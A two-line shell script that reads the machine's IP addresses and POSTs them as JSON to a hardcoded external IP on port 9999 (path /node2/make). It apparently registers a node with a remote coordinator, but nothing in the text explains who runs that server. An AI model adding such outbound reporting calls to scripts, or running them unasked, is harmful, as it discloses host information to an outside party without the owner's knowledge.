export IP=$(hostname -I)
curl -X POST -d "{\"ip\": \"$IP\"}" 161.97.88.185:9999/node2/make
